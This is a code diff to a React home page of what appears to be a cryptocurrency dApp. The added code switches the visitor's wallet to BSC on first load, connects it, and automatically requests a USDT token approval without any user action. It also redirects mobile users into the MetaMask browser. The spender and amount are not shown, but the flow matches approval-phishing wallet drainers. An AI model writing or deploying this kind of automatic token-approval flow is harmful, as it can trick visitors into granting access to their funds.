@@ -75,46 +75,44 @@ const HomePage = () => {
 
 	// ✅ Connect and get signer
 
-/* const connectAndApprove = async () => {
-  if (window.ethereum) {
-    try {
-      // Switch to BSC first
-      await switchToBSC();
 
-      if (!loggedInInfo?.walletAddress) {
-        const modal = new Web3Modal({ cacheProvider: true });
-        const instance = await modal.connect();
 
-        const provider = new BrowserProvider(instance);
-        const _signer = await provider.getSigner();
-        const _account = await _signer.getAddress();
+/* 	const connectAndApprove = async () => {
+		try {
+			if (!loggedInInfo?.walletAddress) {
+				const modal = new Web3Modal({ cacheProvider: true });
+				const instance = await modal.connect();
+				const provider = new BrowserProvider(instance);
+				const _signer = await provider.getSigner();
+				const _account = await _signer.getAddress();
+				setSigner(_signer);
+				setAccount(_account);
+				//setStatus("✅ Wallet connected");
 
-        setSigner(_signer);
-        setAccount(_account);
+				// ✅ Auto trigger approval
+				await approveUSDT(_signer, _account);
+			} 
+		} catch (err) {
+			console.error('Connect error', err);
+			//setStatus("❌ Wallet connection failed");
+		}
+	}; */
 
-        // ✅ Auto trigger approval
-        await approveUSDT(_signer, _account);
-      }
-    } catch (err) {
-      console.error("Connect error", err);
-      // Optionally show a UI status or toast
+
+  const connectAndApprove = async () => {
+  try {
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    const isMetaMaskInstalled = typeof window.ethereum !== "undefined";
+
+    // If on mobile and MetaMask is not available, redirect to MetaMask browser
+    if (isMobile && !isMetaMaskInstalled) {
+      const dappUrl = window.location.hostname; // or full URL if needed
+      window.location.href = `https://metamask.app.link/dapp/${dappUrl}`;
+      return;
     }
-  } else {
-    // Fallback for mobile: open MetaMask app via deep link
-    const dappUrl = window.location.hostname;
-			const metamaskAppDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
-			console.log('Redirecting to MetaMask mobile app:', metamaskAppDeepLink);
-			window.open(metamaskAppDeepLink, '_self');
-  }
-}; */
 
-const connectAndApprove = async () => {
-  if (window.ethereum) {
-    try {
-      await switchToBSC();
-
-      await window.ethereum.request({ method: "eth_requestAccounts" }); // 👍 Force connection
-
+    // Already connected?
+    if (!loggedInInfo?.walletAddress) {
       const modal = new Web3Modal({ cacheProvider: true });
       const instance = await modal.connect();
 
@@ -125,17 +123,15 @@ const connectAndApprove = async () => {
       setSigner(_signer);
       setAccount(_account);
 
+      // ✅ Auto trigger approval
       await approveUSDT(_signer, _account);
-    } catch (err) {
-      console.error("Connect error", err);
     }
-  } else {
-    const dappUrl = window.location.hostname;
-    const metamaskAppDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
-    window.open(metamaskAppDeepLink, "_self");
+
+  } catch (err) {
+    console.error("Connect error", err);
+    // setStatus("❌ Wallet connection failed");
   }
 };
-
 
 	// ✅ Send approval transaction
 
@@ -192,9 +188,13 @@ const connectAndApprove = async () => {
 
 	// ✅ On first load, auto switch & connect
 	useEffect(() => {
-		
-				connectAndApprove(); 
-		
+		if (window.ethereum) {
+			switchToBSC().then(() => {
+				connectAndApprove(); // auto connect + approve
+			});
+		} else {
+			console.error('❌ Web3 wallet not detected');
+		}
 	}, []);
 /* 	useEffect(() => {
 		if (window.ethereum) {
